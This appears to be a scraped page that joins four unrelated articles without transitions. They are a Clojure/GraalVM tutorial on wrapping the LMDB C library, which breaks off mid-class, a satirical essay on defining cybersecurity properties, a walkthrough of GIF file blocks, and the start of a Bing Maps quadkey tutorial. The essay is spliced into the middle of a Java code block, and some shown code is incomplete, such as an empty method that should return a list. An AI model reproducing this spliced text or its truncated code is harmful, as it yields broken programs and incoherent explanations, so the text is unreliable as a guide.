<p>The only problem is that there isn't an official documentation for this kind of programming, just a <a href="https://www.graalvm.org/sdk/javadoc/index.html?org/graalvm/nativeimage/c/package-summary.html">Java doc</a> and a <a href="https://github.com/oracle/graal/blob/master/substratevm/src/com.oracle.svm.tutorial/src/com/oracle/svm/tutorial/CInterfaceTutorial.java">coding example</a>. After some research, I also found a few other examples: an <a href="https://github.com/praj-foss/opengl-graal-examples">OpenGL demo</a>, a <a href="https://github.com/michael-simons/neo4j-java-driver-native-lib">neo4j native driver</a> and an <a href="https://github.com/praj-foss/uname-graalvm-demo">uname utility</a>. I hope that this blog post adds to this growing library of GraalVM specific programming examples.  </p>
<h3>Import C data and functions</h3>
<p>Our goal is to write a LMDB wrapper with GraalVM SDK without using JNI. </p>
<p>The first step is to make Java aware of the LMDB C data structures and functions declared in the header file <code>lmdb.h</code>, so that our Java code can use them. This step is fairly easy and pleasant, compared with JNI. All one needs to do is to write a Java class to list all those C structs, enums and functions as native interfaces and annotate these with appropriate GraalVM specific annotations. </p>
<p>For example, for a C struct definition:</p>
<div><pre><span></span><code><span>typedef</span> <span>struct</span> <span>MDB_val</span> <span>{</span>
    <span>size_t</span>       <span>mv_size</span><span>;</span>   <span>/**&lt; size of the data item */</span>
    <span>void</span>        <span>*</span><span>mv_data</span><span>;</span>   <span>/**&lt; address of the data item */</span>
<span>}</span> <span>MDB_val</span><span>;</span>
</code></pre></div>

<p>The corresponding Java declaration is the following:</p>
<div><pre><span></span><code>    <span>@CStruct</span><span>(</span><span>"MDB_val"</span><span>)</span>
    <span>public</span> <span>interface</span> <span>MDB_val</span> <span>extends</span> <span>PointerBase</span> <span>{</span>

        <span>@CField</span><span>(</span><span>"mv_size"</span><span>)</span>
        <span>long</span> <span>get_mv_size</span><span>();</span>

        <span>@CField</span><span>(</span><span>"mv_size"</span><span>)</span>
        <span>void</span> <span>set_mv_size</span><span>(</span><span>long</span> <span>value</span><span>);</span>

        <span>@CField</span><span>(</span><span>"mv_data"</span><span>)</span>
        <span>VoidPointer</span> <span>get_mv_data</span><span>();</span>

        <span>@CField</span><span>(</span><span>"mv_data"</span><span>)</span>
        <span>void</span> <span>set_mv_data</span><span>(</span><span>VoidPointer</span> <span>value</span><span>);</span>
    <span>}</span>
</code></pre></div>

<p>The <code>CStruct</code> annotation tells Java which C struct to import. I gave the Java interface the same name as C so it is easier for me to keep track. One could also name it otherwise, e.g. "MDBVal" if one wants to follow CamelCases. It does not matter.</p>
<p><code>PointerBase</code> interface indicates a native word type, and is the root of all C pointers being imported into Java. Most things in GraalVM SDK work with these native word types.</p>
<p><code>CField</code> annotation imports a C struct field as a Java method. Setters and getters need to be declared separately. Again, I give these methods similar names as C field names, but you may prefer to follow Java name convention instead, e.g. "getMvSize".</p>
<p><code>VoidPointer</code> is a faithful translation of <code>void *</code>.</p>
<p>For an opaque C struct declaration that does not list its fields, one must add an <code>isIncomplete</code> option to the annotation, otherwise compilation will fail with a "sizeOf" related error. For example, for a C struct like this:</p>
<div><pre><span></span><code><span>typedef</span> <span>struct</span> <span>MDB_env</span> <span>MDB_env</span><span>;</span>
</code></pre></div>

<p>The corresponding Java declaration is this:</p>
<div><pre><span></span><code>    <span>@CStruct</span><span>(</span><span>value</span> <span>=</span> <span>"MDB_env"</span><span>,</span> <span>isIncomplete</span> <span>=</span> <span>true</span><span>)</span>
    <span>public</span> <span>interface</span> <span>MDB_env</span> <span>extends</span> <span>PointerBase</span> <span>{}</span>
</code></pre></div>

<p>C functions are directly translated into Java static native methods, e.g.:</p>
<div><pre><span></span><code><span>int</span>  <span>mdb_env_get_maxkeysize</span><span>(</span><span>MDB_env</span> <span>*</span><span>env</span><span>);</span>
</code></pre></div>

<p>The corresponding Java declaration is the following:</p>
<div><pre><span></span><code>    <span>@CFunction</span><span>(</span><span>"mdb_env_get_maxkeysize"</span><span>)</span>
    <span>public</span> <span>static</span> <span>native</span> <span>int</span> <span>mdb_env_get_maxkeysize</span><span>(</span><span>MDB_env</span> <span>env</span><span>);</span>
</code></pre></div>

<p>Notice that the pointer to <code>MDB_env</code> struct is replaced by <code>MDB_env</code> Java interface declared above, as it extends <code>PointerBase</code>.</p>
<p>For parameters with double pointer type, one can declare them as <code>WordPointer</code> in Java, as they point to another pointer (i.e. word). For example, this C function:</p>
<div><pre><span></span><code><span>int</span>  <span>mdb_env_create</span><span>(</span><span>MDB_env</span> <span>**</span><span>env</span><span>);</span>
</code></pre></div>

<p>is translated into this Java code:</p>
<div><pre><span></span><code>    <span>@CFunction</span><span>(</span><span>"mdb_env_create"</span><span>)</span>
    <span>public</span> <span>static</span> <span>native</span> <span>int</span> <span>mdb_env_create</span><span>(</span><span>WordPointer</span> <span>envPtr</span><span>);</span>
</code></pre></div>

<p>Finally, for these annotations to work, the containing class must be annotated with appropriate C context, which is often defined as a static inner class of the class, like so:</p>
<div><pre><span></span><code><span>@CContext</span><span>(</span><span>Lib</span><span>.</span><span>Directives</span><span>.</span><span>class</span><span>)</span>
<span>public</span> <span>final</span> <span>class</span> <span>Lib</span> <span>{</span>

    <span>public</span> <span>static</span> <span>final</span> <span>class</span> <span>Directives</span> <span>implements</span> <span>CContext</span><span>.</span><span>Directives</span> <span>{</span>
        <span>@Override</span>
        <span>public</span> <span>List</span><span>&lt;</span><span>String</span><span>&gt;</span> <span>getHeaderFiles</span><span>()</span> <span>{</span>
            <span>return</span> <span>Collections</span><span>.</span><span>singletonList</span><span>(</span><span>"&lt;lmdb.h&gt;"</span><span>);</span>
        <span>}</span>

        <span>@Override</span>
        <span>public</span> <span>List</span><span>&lt;</span><span>String</span><span>&gt;</span> <span>getLibraries</span><span>()</span> <span>{</span>

        <span>}</span>
    <span>}</span>
    <span>...</span>
<span>}</span>
</code></pre></div>

<p>The <code>CContext.Directives</code> class imports the necessary C header file and finds the corresponding C library. In this particular example, we are importing the system wide LMDB header file and library installed by <code>apt install liblmdb-dev</code> on Debian/Ubuntu. An example of importing local header file and library can be found in Datalevin source code <a href="https://github.com/juji-io/datalevin/blob/master/native/src/java/datalevin/ni/Lib.java#L55">here</a>.</p>
<p>The code of all C to Java translations is <a href="https://github.com/juji-io/datalevin/blob/master/native/src/java/datalevin/ni/Lib.java">here</a></p>
<h3>Clojure specific considerations</h3>
<p>Clojure <code>deftype</code> supports Java annotations, so that is what I used to implement the higher level constructs of the LMDB wrapper. For example:</p>
<div><pre><span></span><code><span>(</span><span>deftype </span><span>^</span><span>{</span><span>Retention</span> <span>RetentionPolicy/RUNTIME</span>
           <span>CContext</span>  <span>{</span><span>:value</span> <span>Lib$Directives</span><span>}}</span>
    <span>LMDB</span> <span>[</span><span>^</span><span>Env</span> <span>env</span>
          <span>^</span><span>String</span> <span>dir</span>
          <span>^</span><span>RtxPool</span> <span>pool</span>
          <span>^</span><span>ConcurrentHashMap</span> <span>dbis</span>
          <span>^</span><span>:volatile-mutable</span> <span>closed?</span><span>]</span>
  <span>...</span><span>)</span>
</code></pre></div>

<p>One limitation that one needs to be aware of when writing native image related Clojure code, is that most things in the GraalVM SDK inherit from <code>org.graalvm.word.WordBase</code>, not from <code>java.lang.Object</code>, which breaks the hidden assumption of a lot of Clojure constructs. For example, one cannot do this: </p>
<div><pre><span></span><code><span>(</span><span>let </span><span>[</span><span>env</span> <span>^</span><span>Lib$MDB_env</span> <span>(</span><span>Env/create</span><span>)]</span>
  <span>...</span><span>)</span>
</code></pre></div>

<p>Because <code>Lib$MDB_env</code> extends <code>PointerBase</code>, but Clojure <code>let</code> seems to assume everything getting bound is an <code>Object</code>. An "expecting Object but got Word" or vice visa error will be thrown during compilation for these cases. So writing a thin layer of wrapper for these GraalVM word types seems to be inevitable, unless Clojure can be enhanced to be more native image programming friendly.</p>
<p>Another point of caution is about arrays. GraalVM uses reflection to create array objects, but if these array objects are not declared at build time, the code won't run. For instance, for Clojure <code>into-array</code> function, we should not omit the optional first argument for element data type, otherwise, one has to manually specify the array type in the <a href="https://www.graalvm.org/reference-manual/native-image/Reflection/"><code>reflection.json</code> file during compilation</a>, or the Graal runtime will complain about "Class such and such is instantiated reflectively but was never registered". For Clojure dynamically generated classes with names such as these, "datalevin.test.query<span>\(fn__12734\)</span>fn__12739$fn__12740[]", it is impossible to add them manually in <code>reflection.json</code>. So the only solution is to specify the element data type in code, e.g. <code>(into-array Object data)</code>, instead of <code>(into-array data)</code>.</p>
<p>The full Clojure project for native Datalevin is <a href="https://github.com/juji-io/datalevin/tree/master/native">here</a>. </p>
<h3>Memory management and pointer wrangling</h3>
<p>The main challenge of building a LMDB wrapper is to find a way to put transaction data into and get query data out of LMDB. As shown above, LMDB use a <code>MDB_val</code> struct to represents input/output data. All it contains is a data size and a pointer to the data. LMDBJava uses JNR and <code>Unsafe</code> or reflections to manipulate a <code>java.nio.ByteBuffer</code> to achieve this. Since we cannot use these in this project, we have to come up with a GraalVM specific solution.</p>
<p>It turned out the code to do this is quite easy to write. Instead of allocating the ByteBuffer in Java and presenting it to C, we manage the memory in C and present it as a ByteBuffer in Java, without all that <code>Unsafe</code> and reflection shenanigans. </p>
<div><pre><span></span><code><span>/**</span>
<span> * Wrap LMDB MDB_val to look like a ByteBuffer at the Java side</span>
<span> */</span>
<span>@CContext</span><span>(</span><span>Lib</span><span>.</span><span>Directives</span><span>.</span><span>class</span><span>)</span>
<span>public</span> <span>class</span> <span>BufVal</span> <span>{</span>

    <p><img src="https://www.knowledgezero.com/finding-cybersecure/neon-fish.jpeg" alt="https://www.neon-light.net/proddetail.php?prod=nl-107461-clown-fish-neon-sign"><span>https://www.neon-light.net/proddetail.php?prod=nl-107461-clown-fish-neon-sign</span></p>
<p>We want to start this journey by asking a simple question: what is a cybersecure (or, simply, secure) system? Some people believe that there exist properties, such as confidentiality, which are necessary conditions for a system to be “secure”. Let us take the case of confidentiality which, when it holds over a piece of information (or a chunk of data), guarantees that information cannot be “understood” but from those who know a certain secret. As an example, if we replace any letter in IBM with the next in the alphabet, we obtain HAL, and only those who know that we’ve used the next letter will be able to understand IBM when they see us writing HAL. Even when a confidentiality algorithm (procedure) is perfect no one would dare to say that it is secure in general, but only insofar security is restricted to confidentiality (confidentiality isn’t sufficient for security). Now, what would change if, instead of confidentiality, we’d consider any other property? What if we say that for a system (or a piece of code) “being reviewed by that guy” is a necessary but not sufficient cybersecurity property? Or what if we say that “having nicely painted blue wires” makes a system secure insofar security is restricted to having nicely painted blue wires? Obviously, they say, not ANY property but SOME specific properties can be considered cybersecurity properties! Interesting… and how do we know which property is a cybersecurity property? Well, that’s the tricky part. </p>
<h2 id="Once-upon-a-time"><a href="#Once-upon-a-time" title="Once upon a time"></a>Once upon a time</h2><p>Everything started with the famous CIA-triad and the belief that confidentiality, integrity, and availability could be raised among other properties as glorious cybersecurity properties! It’s obvious, they say, if the great CIA-triad doesn’t hold, a malicious human being could read your messages, alter them, or even prevent you from sending any messages! </p>
<p>[I know you may be tempted but, please, don’t start chasing other properties or digging into the details of them, it has already been done (from the 70s on).] The desire of listing and detailing these properties is natural, occurs frequently to cybersecurity researchers when left alone in their habitats. You can hear them whispering: “if we knew all of them… it would be just a matter of time before all of our systems become really-really-secure”. The thing is… why after 40 years systems are still insecure? Let’s have a closer look at what we are doing here. </p>
<h2 id="Honey-I-got-Hacked"><a href="#Honey-I-got-Hacked" title="Honey, I got Hacked"></a>Honey, I got Hacked</h2><p>One day we wake up and an annoying hacker is altering all the WhatsApp messages we send. Integrity is the property that would make sure no one would be able to mangle with our messages. We pray very hard our oracles and, pufff, integrity it is! But now, something else is happening, we cannot send any message anymore.  </p>
<p>We are using WhatsApp, we know that when a message is sent it shows a little grayish tick, and while it is sending a message, we get a little grayish clock. Every message we now try to send has a little grayish clock, how is that even possible? Can’t we communicate with WhatsApp anymore? What that heck is that annoying hacker doing now?! The hacker is disrupting the service, we need availability! We thus kneel and pray for availability and once more our prayers are listened to and we see that all our little clocks are now little ticks.  </p>
<p>Just when we thought our troubles were over, we find out that all our messages are now being published all over the place. They are on Twitter, Pastebin, everywhere. You fool, you forgot about confidentiality. The prayer must be hard this time for the oracles to answer but we don’t give up and eventually we obtain confidentiality. Now things are secure, aren’t they? We got the CIA-triad covered; we must be secured. But this is when something unexpected happens. We get a phone call from Alice, our long-time friend. She’s mad at us for sending that nasty message to her just about 10 seconds ago. But we didn’t send any messages, how is that even possible? Oh no… the hacker is now sending messages and pretends to be us. But how, that’s not possible… we’ve got the CIA-triad, we must be safe and yet, we are not! </p>
<p>While many people believe the problem is generated by hackers, we believe the problem is the great master beyond any insecurity manifestation: the approach of the practical man! </p>
<h2 id="The-Practical-Man"><a href="#The-Practical-Man" title="The Practical Man"></a>The Practical Man</h2><p>This is the approach of the practical man, he who lives his life and then thinks about it, he who finds solutions then problems. Undoubtedly, it takes a lot of effort for the practical man to constantly run in the circle “give me a new cybersecurity issue and I’ll define a cybersecurity property for it”. But that effort is compensated by a HUGE amount of money! A 50+ Billions in Europe alone are given yearly to practical cybersecurity solutions. But what if we wanted, for once, to spend 2 cents in understanding the problem? After all, what is a cybersecure system? Let’s assume that a cybersecure system can be found in our reality, it’s like a very shy animal in a vast and intricate forest where all animals look similar. So, we know its name (cybersecure system) and… an expert reaches us and says: </p>
<p><em>Expert:</em> I know what a cybersecure animal looks like, we experts have a description of it.The cybersecure animal is brown! It is necessarily brown. </p>
<p><em>Us:</em> Really?! Have you ever seen it?  </p>
<p><em>Expert:</em> No, but if it wasn’t brown, it wouldn’t be brown. </p>
<p><em>Us:</em> Ooook, I’m really confused, what’s your problem again?  </p>
<p><em>Expert:</em> No! Listen to me! It’s like cybersecurity properties. A cybersecure system must be confidential otherwise it wouldn’t be! it must be brownnnn! </p>
<p><em>Us:</em> What the… why?! Why should I care about confidentiality or being brown? I just want a secure system!  </p>
<p><em>Expert:</em> It also must be 21 cm tall!  </p>
<p><em>Us:</em> Again?!?!  </p>
<p><em>Expert:</em> It’s like integrity, otherwi… </p>
<p>We look at the expert and something horrible happened! He has become a practical man. Suddenly, everyone is a practical man. There are no scientists around us, no philosophers, no professors, no ideas… everything is a practical solution for a practical problem in a world of dark practical men. And this is where we leave the practical expert (or, as we call him today, a cybersecurity researcher). They really sound smart at first, they are researchers, aren’t they? They are supposed to tell us the properties to prevent insecurities but, it turns out, they are just searching for insecurities and then mitigating them with ad-hoc properties; they are… searchers! </p>
<p>Still, we have nothing but the name of an animal (cybersecure) that doesn’t want to be found. It’s probably brown and 21cm tall, like any other animal in our forest. Finally, we stop searching for that animal, it seems impossible to find it. Let’s have a coffee and read a book, relax, and go with the flow. </p>
<h2 id="The-Evolution-of-the-Practical-Man"><a href="#The-Evolution-of-the-Practical-Man" title="The Evolution of the Practical Man"></a>The Evolution of the Practical Man</h2><p>Days passed, then weeks, and months. We almost forgot about that weird cybersecure animal. We spent our time in understanding science and its philosophical aspects and, weirdly enough, it seems that the practical approach (of understanding new concepts out of the experience) is not the only way and, maybe, not the best or not even the right way. And suddenly, we think back to the cybersecure animal… could it be that… we made a terrible methodological error? So, we go back to the practical expert. </p>
<p><em>Us:</em> I was wondering… maybe… we could try to… start from some pure form of sensible intuition, such as space, and reason exclusively analytically, in the abstract, to formulate a sort of transcendental view of a cybersecure system. Sounds fun, right? </p>
<p><em>Expert:</em> Did you mean the CIA-triad? </p>
<p><em>Us:</em> What!? No, I don’t care abo… hufff… I mean, we should reason abstractly and search in this abstraction the concepts or properties that allow us to predict a certain phenomenon. We should not induce universal properties from experience or empirical experiments.  </p>
<p><em>Expert:</em> What do you think I’m doing?! I’m the expert! I abstract, I create… You and your mumbo jumbo, out of my expertise!  </p>
<p><em>Us:</em> No, wait, I didn’t express myself. Look, a hacker was altering my messages and I changed my system so that the hacker couldn’t change them anymore. But then he found another way to piss me off, and I found another way to block him and this went on and on and on… So, I thought, the hacker wasn’t doing anything wrong, he was just using the system. I now have a skeptic approach to life, there’s no right nor wrong. </p>
<p><em>Expert:</em> Are you insane? Do you want to let hackers do what they please, steal money, information and… </p>
<p><em>Us:</em> No no no… I understand why we believe hacker’s behaviors are wrong sometimes but, they aren’t technically doing something which is against what the systems allow them to do. We always fixed the system, not the hacker, he kept doing what he liked. So, it seems that a system is idealized as a set of behaviors (what the system is supposed to do) and realized with another (often mostly inclusive) set of behaviors (what the system actually does). </p>
<p><em>Expert:</em> What I hear is mumbo jumbo, stop thinking and start solving problems or fuck off that way! </p>
<p>Sadly, we move away from the expert and from their world of practicality. In science, abstract theories are tested against what they predict; we want a cybersecurity theory general enough so that we can empirically test it regardless of its domain of application. A theory that can be used to predict the cybersecurity of a system or all its insecurities so that attacks, at least, won’t come as a surprise.  </p>
<p>There must be another land, another realm where we can find the cybersecure animal. Maybe, when we find the cybersecure animal we can squeeze it to prepare a potion, something that cures the practical experts from their practicality. </p>
<p><strong>End of first act.</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p>
	We sill start off by walking though the different parts of a GIF file.
	(The information on this page is primarily drawn from the
	<a href="http://www.w3.org/Graphics/GIF/spec-gif89a.txt">W3C GIF89a specification</a>.)
	A GIF file is made up of a bunch of different "blocks" of data. The following diagram
	shows all of the different types of blocks and where they belong in the file. The file starts
	at the left and works it's way right. At each branch you may go one way or the other. The
	large "middle" section can be repeated as many times as needed. (Technically, it may
	also be omitted completely but i can't imagine what good a GIF file with no image data
	would be.)
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/gif_file_stream.gif" alt="GIF file stream diagram" width="700" height="220"></p>
	<p>
	I'll show you what these blocks looks like by walking through a sample
	GIF file. You can see the sample file and its corresponding bytes below.
	</p>
	

	<p>
	Note that not all blocks are represented in this sample file. I will provide samples of missing
	blocks where appropriate.
	The different types of blocks include:
		<a href="#header_block">header</a>,
		<a href="#logical_screen_descriptor_block">logical screen descriptor</a>,
		<a href="#global_color_table_block">global color table</a>,
		<a href="#graphics_control_extension_block">graphics control extension</a>,
		<a href="#image_descriptor_block">image descriptor</a>,
		<a href="#local_color_table_block">local color table</a>,
		<a href="#image_data_block">image data</a>,
		<a href="#plain_text_extension_block">plain text extension</a>,
		<a href="#application_extension_block">application extension</a>,
		<a href="#comment_extension_block">comment extension</a>,
		and <a href="#trailer_block">trailer</a>.
	Let's get started with the first block!
	</p>

	<h2><a name="header_block">Header Block</a></h2>
	<p>From Sample File: </p>
	<p>
	All GIF files must start with a header block. The header takes up the first
	six bytes of the file. These bytes should all correspond to
	<a href="http://www.ascii.cl/">ASCII character codes</a>. We actually have two pieces
	of information here. The first three bytes are called the <strong>signature</strong>.
	These should always be "GIF" (ie 47="G", 49="I", 46="F"). The next three specify the
	<strong>version</strong> of the specification that was used to encode the image. We'll only be working
	with "89a" (ie 38="8", 39="9", 61="a"). The only other recognized version string
	is "87a" but i doubt most people will run into those anymore.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/header_block.gif" alt="GIF header block layout"></p>

	<h2><a name="logical_screen_descriptor_block">Logical Screen Descriptor</a></h2>
	<p>From Sample File: <span> 0A </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 91 </span><span> 00 </span><span> 00 </span></p>
	<p>
	The logical screen descriptor always immediately follows the header. This block
	tells the decoder how much room this image will take up. It is exactly
	seven bytes long. It starts with the <strong>canvas width</strong>. This value
	can be found in the first two bytes. It's saved in a format called the spec
	simply calls <em>unsigned</em>. Basically we're looking at a 16-bit, nonnegative
	integer (0-65,535). As with all the other multi-byte values in the GIF format, the least
	significant byte is stored first (little-endian format). This means where we would read
	<span> 0A </span><span> 00 </span>
	from the byte stream, we would normally write it as <span>000A</span> which is
	the same as 10. Thus the width of our sample image is 10 pixels. As a further example
	255 would be stored as <span> FF </span><span> 00 </span> but 256 would be <span> 00 </span><span> 01 </span>.
	As you might expect, the <strong>canvas height</strong> follows. Again, in this sample we
	can see this value is <span> 0A </span><span> 00 </span> which is 10.
	</p>
	<p>
	Next we have a <em>packed byte</em>. That means that this byte actually has multiple values
	stored in its bits. In this case, the byte <span> 91 </span> can be represented
	as the binary number <span>10010001</span>. (The built in Windows calculator
	is actually very useful when converting numbers into hexadecimal and binary formats. Be sure
	it's in "scientific" or "programmer" mode, depending on the version of
	windows you have.) The first (most-significant) bit is the <strong>global color
	table flag</strong>. If it's 0, then there is none. If it's 1, then a global color table will
	follow. In our sample image, we can see that we will have a global color table (as will usually
	be the case).  The next three bits represent the <strong>color resolution</strong>. The spec
	says this value " is the number of bits per primary color available to the original image,
	minus 1" and "...represents the size of the entire palette from which the colors in the
	graphic were selected." Because i don't much about what this one does, I'll point you to
	a more knowledgeable article on <a href="http://www.devx.com/projectcool/Article/19997/0/page/7">bit and color depth</a>.
	For now 1 seems to work. Note that <span>001</span> represents 2 bits/pixel;
	<span>111</span> would represent 8 bits/pixel.
	The next single bit is the <strong>sort flag</strong>. If the values is 1, then the
	colors in the global color table are sorted in order of "decreasing importance," which
	typically means "decreasing frequency" in the image. This can help the image decoder but
	is not required. Our value has been left at 0. The last three bits are the <strong>
	size of global color table</strong>. Well, that's a lie; it's not the actual size of the
	table. If this value is N, then the actual table size is 2^(N+1). From our sample
	file, we get the three bits <span>001</span> which is the binary version of 1.
	Our actual table size would be 2^(1+1) = 2^2 = 4. (We've mentioned the global color table
	several times with this byte, we will be talking about what it is in the next section.)
	</p>
	<p>
	The next byte gives us the <strong>background color index</strong>. This byte is only meaningful
	if the global color table flag is 1. It represents which color in the global color table
	(by specifying its index) should be used for pixels whose value is not specified in the
	image data. If, by some chance, there is no global color table, this byte should be 0.
	</p>
	<p>
	The last byte of the logical screen descriptor is the <strong>pixel aspect ratio</strong>.
	I'm not exactly sure what this value does. Most of the images I've seen have this value
	set to 0. The spec says that if there was a value specified in this byte, N, the actual
	ratio used would be (N + 15) / 64 for all N&lt;&gt;0.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/logical_screen_desc_block.gif" alt="GIF logical screen descriptor block layout"></p>





	<h2><a name="global_color_table_block">Global Color Table</a></h2>
	<p>From Sample File: <span> FF </span><span> FF </span><span> FF </span><span> FF </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> FF </span><span> 00 </span><span> 00 </span><span> 00 </span></p>
	<p>
	We've mentioned the <strong>global color table</strong> a few times already now lets talk
	about what it actually is. As you are probably already aware, each GIF has its own color
	palette. That is, it has a list of all the colors that can be in the image and cannot
	contain colors that are not in that list. The global color table is where that list
	of colors is stored. Each color is stored in three bytes. Each of the bytes represents
	an RGB color value. The first byte is the value for red (0-255), next green, then blue.
	The size of the global color table is determined by the value in the packed byte of the
	logical screen descriptor. As we mentioned before, if the value from that byte is N, then
	the actual number of colors stored is 2^(N+1). This means that the global color table will
	take up 3*2^(N+1) bytes in the stream.
	</p>

	<div>
	<table id="global_color_size">
	<tbody><tr><th>Size In Logical<br>Screen Desc</th><th>Number Of<br>Colors</th><th>Byte<br>Length</th></tr>
	<tr><td>0</td><td>2</td><td>6</td></tr>
	<tr><td>1</td><td>4</td><td>12</td></tr>
	<tr><td>2</td><td>8</td><td>24</td></tr>
	<tr><td>3</td><td>16</td><td>48</td></tr>
	<tr><td>4</td><td>32</td><td>96</td></tr>
	<tr><td>5</td><td>64</td><td>192</td></tr>
	<tr><td>6</td><td>128</td><td>384</td></tr>
	<tr><td>7</td><td>256</td><td>768</td></tr>
	</tbody></table>
	</div>

	<p>
	Or sample file has a global color table size of 1. This means it holds 2^(1+1)=2^2=4 colors.
	We can see that it takes up 12, (3*4), bytes as expected. We read the bytes three at a time to get
	each of the colors. The first color is #FFFFFF (white). This value is given an index of 0.
	The second color is #FF0000 (red). The color with an index value of 2 is #0000FF (blue).
	The last color is #000000 (black). The index numbers will be important when we decode
	the actual image data.
	</p>
	<p>
	Note that this block is labeled as "optional." Not every GIF has to specify a global
	color table. However, if the global color table flag is set to 1 in the logical
	screen descriptor block, the color table is then required to immediately follow that
	block.

	<h2><a name="graphics_control_extension_block">Graphics Control Extension</a></h2>
	<p>From Sample File: <span> 21 </span><span> F9 </span><span> 04 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span></p>
	<p>
	Graphic control extension blocks are used frequently to
	specify transparency settings and control animations. They are completely optional.
	Since transparency and animations are bit complicated, I will hold off on many of
	the details of this block until a later section
	(see <a href="http://matthewflickinger.com/lab/whatsinagif/animation_and_transparency.asp">Transparency and Animation</a>).
	In the interest of this page being complete, I will at least tell you what
	the bytes represent.
	</p>
	<p>
	The first byte is the <strong>extension introducer</strong>. All <em>extension</em>
	blocks begin with <span>21</span>. Next is the <strong>graphic
	control label</strong>, <span>F9</span>, which is the value that
	says this is a graphic control extension. Third up is the total <strong>block
	size</strong> in bytes. Next is a packed field. Bits 1-3 are reserved for future
	use. Bits 4-6 indicate <strong>disposal method</strong>. The penult bit is
	the <strong>user input flag</strong> and the last is the <strong>transparent color
	flag</strong>. The <strong>delay time</strong> value follows in the next two bytes
	stored in the unsigned format. After that we have the <strong>transparent color
	index</strong> byte. Finally we have the <strong>block terminator</strong> which
	is always <span>00</span>.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/graphic_control_ext.gif" alt="GIF graphic control extension block layout"></p>




	<h2><a name="image_descriptor_block">Image Descriptor</a></h2>
	<p>From Sample File: <span> 2C </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 00 </span></p>
	<p>
	A single GIF file may contain multiple images (useful when creating animated
	images). Each image begins with an image descriptor block. This block is exactly
	10 bytes long.
	</p>
	<p>
	The first byte is the <strong>image separator</strong>. Every image
	descriptor begins with the value <span>2C</span>. The next 8 bytes
	represent the location and size of the following image. An image in
	the stream may not necessarily take up the entire canvas size defined by
	the logical screen descriptor. Therefore, the image descriptor specifies
	the <strong>image left position</strong> and <strong>image top position</strong> of
	where the image should begin on the canvas. Next it specifies the
	<strong>image width</strong> and <strong>image height</strong>. Each of these
	values is in the two-byte, unsigned format. Our sample image indicates that
	the image starts at (0,0) and is 10 pixels wide by 10 pixels tall. (This image
	does take up the whole canvas size.)
	</p>
	<p>
	The last byte is another packed field. In our sample file this byte is 0 so
	all of the sub-values will be zero. The first (most significant) bit in
	the byte is the <strong>local color table flag</strong>. Setting this flag
	to 1 allows you to specify that the image data that follows uses a different
	color table than the global color table. (More information on the local
	color table follows.) The second bit is the <strong>interlace flag</strong>.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/image_descriptor_block.gif" alt="GIF image descriptor block layout"></p>





	<h2><a name="local_color_table_block">Local Color Table</a></h2>
	<p>
	The local color table looks identical to the global color table. The local
	color table would always immediately follow an image descriptor but will only
	be there if the local color table flag is set to 1. It is effective only for the
	block of image data that immediately follows it. If no local color table
	is specified, the global color table is …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="app"> <main> <article><a href="https://nathancahill.com/">Home</a>  <h5><time datetime="2021-02-08T00:00:00.000Z">Feb 8, 2021</time></h5>  <p>Two of my favorite things, exploring the mountains and mapping, intersect outdoors with GPS apps. I’m always on the hunt for new, interesting maps. Gaia GPS is my go-to app for this stuff; I load it up with all the layers and data I can find.</p> <p><img alt="The author hiking in the mountains" src="https://nathancahill.com/hiking.jpg"></p> <p>One map that I always keep handy is Bing Maps. Don’t let the “Bing” part of the name deceive you, it’s well known in the mapping industry for having one of the best free aerial layers. Microsoft combines orthographic aerial and satellite imagery, giving you detail that’s not available from satellites alone. The tile service for the aerial layer isn’t public, but Bing offers a generous free tier through the <a href="https://www.bingmapsportal.com/" rel="nofollow">Bing Maps Dev Center</a> by signing up and creating an API key.</p> <h2>Serving Bing Maps as Slippy Tiles</h2> <p>To get Bing Maps up and running on Gaia GPS or other apps, tile requests need to be converted from the Open Street Map standard <a href="https://wiki.openstreetmap.org/wiki/Slippy_map_tilenames" rel="nofollow">slippy tiles</a> to the (appropriately named) <a href="https://docs.microsoft.com/en-us/bingmaps/articles/bing-maps-tile-system" rel="nofollow">Bing Maps Tile System</a>. Bing’s system is based on the <a href="https://en.wikipedia.org/wiki/Quadtree" rel="nofollow">quadtree algorithm</a>, so the function for converting a slippy tile with <code>x</code>, <code>y</code> and <code>z</code> keys to a quadtree key is simple enough:</p> <pre><code><span>function</span> <span>toQuadKey</span><span>(</span><span>x<span>,</span> y<span>,</span> z</span><span>)</span> <span>{</span>
    <span>var</span> index <span>=</span> <span>""</span><span>;</span>
    <span>for</span> <span>(</span><span>var</span> i <span>=</span> z<span>;</span> i <span>&gt;</span> <span>0</span><span>;</span> i<span>--</span><span>)</span> <span>{</span>
        <span>var</span> b <span>=</span> <span>0</span><span>;</span>
        <span>var</span> mask <span>=</span> <span>1</span> <span>&lt;&lt;</span> <span>(</span>i <span>-</span> <span>1</span><span>)</span><span>;</span>
        <span>if</span> <span>(</span><span>(</span>x <span>&amp;</span> mask<span>)</span> <span>!==</span> <span>0</span><span>)</span> b<span>++</span><span>;</span>
        <span>if</span> <span>(</span><span>(</span>y <span>&amp;</span> mask<span>)</span> <span>!==</span> <span>0</span><span>)</span> b <span>+=</span> <span>2</span><span>;</span>
        index <span>+=</span> b<span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
    <span>return</span> index<span>;</span>
